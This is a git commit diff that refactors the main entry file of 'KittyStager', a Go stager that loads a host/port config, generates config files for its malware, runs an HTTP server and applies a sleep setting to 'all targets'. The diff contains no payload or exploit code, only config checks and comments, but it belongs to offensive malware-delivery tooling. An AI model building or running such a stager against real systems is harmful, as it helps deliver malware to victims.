62e1fb1b64c74194434634ecd9c9b975b61a68ac
Enelg52 <yann.grossenbacher@bluewin.ch>
2022-10-21 12:29:09 +0200

    refactor code

--- cmd/kittyStager/main.go
+++ cmd/kittyStager/main.go
@@ -1,6 +1,3 @@
-/*
-Copyright © 2022 Enelg
-*/
 package main
 
 import (
@@ -8,7 +5,6 @@ import (
 	"GoStager/cmd/config"
 	"GoStager/cmd/http"
 	"GoStager/cmd/util"
-	"errors"
 	"fmt"
 	color "github.com/logrusorgru/aurora"
 )
@@ -16,17 +12,20 @@ import (
 func main() {
 	fmt.Println(color.Cyan("                     _\n                    / )\n                   ( (\n     A.-.A  .-\"\"-.  ) )\n    / , , \\/      \\/ /\n   =\\  t  ;=    /   /\n     `--,'  .\"\"|   /\n         || |  \\\\ \\\n        ((,_|  ((,_\\\n"))
 	fmt.Println(color.Cyan("KittyStager - A simple stager written in Go\n"))
+	// Get the config
 	conf, err := config.GetConfig()
 	if err != nil {
 		util.ErrPrint(err)
+		return
 	}
-	//check config
-	if conf.Conf.Host == "" || conf.Conf.Port == 0 || conf.Conf.EndPoint == "" || conf.Conf.UserAgent == "" || conf.Conf.MalPath == nil {
-		util.ErrPrint(errors.New("please check your config file"))
+	// Check the config
+	err = conf.CheckConfig()
+	if err != nil {
+		util.ErrPrint(err)
 		return
 	}
 	fmt.Println(color.Green("[+] Config loaded"))
-	//generate config file for the malwares
+	// Generate config file for the malware's
 	err = util.GenerateConfig(conf)
 	if err != nil {
 		util.ErrPrint(err)
@@ -34,10 +33,12 @@ func main() {
 	}
 	fmt.Println(color.Green("[+] Config file generated"))
 	fmt.Println(color.Green("[+] Starting http server"))
-	fmt.Printf("%s %d%s %s %s\n", color.Green("[+] Sleep set to"), color.Yellow(conf.Conf.Sleep), color.Yellow("s"), color.Green("on"), color.Yellow("all targets"))
+	fmt.Printf("%s %d%s %s %s\n", color.Green("[+] Sleep set to"), color.Yellow(conf.GetSleep()), color.Yellow("s"), color.Green("on"), color.Yellow("all targets"))
+	// Start the http server
 	go http.CreateHttpServer(conf)
 	err = cli.Cli(conf)
 	if err != nil {
 		util.ErrPrint(err)
+		return
 	}
 }
